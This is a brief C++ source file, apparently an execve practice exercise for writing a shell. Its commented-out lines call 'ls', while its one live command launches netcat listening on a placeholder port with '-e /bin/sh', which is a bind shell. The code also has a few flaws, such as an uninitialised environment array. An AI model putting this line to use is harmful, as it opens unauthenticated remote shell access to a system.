//#include "includes.h"

#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

#include <stdio.h>
#include <iostream>

#include <string.h>

using namespace std;

#define PATHLEN 2048
#define ARGLEN 256

//int execute_process(struct process_info* p1);
//int execute_process_piped(struct process_info* p1, struct process_info* p2);

int main(){
   // /* bash */
   // execve("/usr/bin/ls", ["ls", "-l"], [/* 46 vars */]);
   // /* boss */
   // execve("/bin/ls", ["ls", "-l"], [/* 30 vars */]);
   // /* csh */
   // execve("/usr/bin/ls", ["ls", "-l"], [/* 53 vars */]);
   // /* fish */
   // execve("/usr/bin/ls", ["ls", "-l"], [/* 50 vars */]);
   int i;
   int argc = 2;
   //char argv[argc][ARGLEN];
   char* argv[argc];
   char * const environ[1];
   char * const command[] = {"nc", "-l", "-p", "porthere", "-e", "/bin/sh", NULL};
   execve("/usr/bin/nc", command, environ);

   
   // for(i = 0; i < argc; i++){
   //    argv[i]=(char*)malloc(sizeof(char)*ARGLEN);
   // }  
   
   // strcpy(argv[0], "ls");
   // strcpy(argv[1], "-l");

   // for(i = 0; i < argc; i++){
   //    cout << argv[i];
   // }
   
   // execv("/usr/bin/ls", argv);

   
   
   
   cout << "\nexit program\n";
   //free(argv[0]);
   return 0;
}
